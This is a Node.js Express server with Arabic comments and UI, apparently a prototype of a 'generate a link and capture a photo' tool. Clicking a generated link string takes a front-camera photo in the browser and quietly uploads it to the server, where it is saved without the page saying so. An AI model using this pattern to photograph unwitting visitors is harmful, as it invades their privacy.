// server.js
const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// إعداد تخزين الصور
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = path.join(__dirname, 'uploads');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir);
    cb(null, dir);
  },
  filename: (req, file, cb) => {
    cb(null, 'capture_' + Date.now() + '.png');
  }
});
const upload = multer({ storage });

// صفحة HTML مباشرة من السيرفر
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>توليد روابط والتقاط الصور</title>
<style>
body { font-family: Arial,sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; background:#1f1c2c; color:white; }
h1 { margin-bottom:20px; }
#imageContainer { width:300px; height:300px; border:3px solid #fff; border-radius:12px; display:flex; align-items:center; justify-content:center; overflow:hidden; margin-bottom:20px; background:#222; }
#imageContainer img { width:100%; height:100%; object-fit:cover; }
button { padding:10px 20px; margin:5px; cursor:pointer; border:none; border-radius:8px; background:#ff5555; color:white; font-size:16px; }
#dynamicLink { margin-top:10px; cursor:pointer; color:#00ffcc; text-decoration:underline; user-select:text; }
</style>
</head>
<body>
<h1>توليد روابط والتقاط الصور</h1>
<div id="imageContainer"><span>لا توجد صورة بعد</span></div>
<button id="generateLink">توليد رابط متغير</button>
<div id="dynamicLink"></div>
<button id="downloadImage">تحميل الصورة</button>

<script>
const generateBtn = document.getElementById('generateLink');
const dynamicLink = document.getElementById('dynamicLink');
const imageContainer = document.getElementById('imageContainer');
const downloadBtn = document.getElementById('downloadImage');
let currentImageData = '';

function generateRandomLink() {
  return 'capture_' + Math.random().toString(36).substring(2,10);
}

generateBtn.addEventListener('click', () => {
  const link = generateRandomLink();
  dynamicLink.textContent = link;

  dynamicLink.onclick = async () => {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(resolve => setTimeout(resolve,500));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 300;
        canvas.height = video.videoHeight || 300;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video,0,0,canvas.width,canvas.height);

        const imgData = canvas.toDataURL('image/png');
        currentImageData = imgData;

        imageContainer.innerHTML = '';
        const img = document.createElement('img');
        img.src = imgData;
        imageContainer.appendChild(img);

        const blob = await (await fetch(imgData)).blob();
        const formData = new FormData();
        formData.append('image', blob, 'capture.png');

        fetch('/upload', { method:'POST', body: formData })
          .then(res => res.json())
          .then(data => console.log('تم حفظ الصورة على السيرفر:', data));

        stream.getTracks().forEach(track => track.stop());
      } catch(err) {
        alert('فشل في الوصول للكاميرا');
        console.error(err);
      }
    } else alert('الكاميرا غير مدعومة في متصفحك');
  };
});

downloadBtn.addEventListener('click', () => {
  if (!currentImageData) return alert('لا توجد صورة للتحميل');
  const link = document.createElement('a');
  link.href = currentImageData;
  link.download = 'captured_image.png';
  link.click();
});
</script>
</body>
</html>
  `);
});

// استقبال الصور وحفظها
app.post('/upload', upload.single('image'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No image uploaded' });
  res.json({ success: true, filename: req.file.filename });
});

// تشغيل السيرفر
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
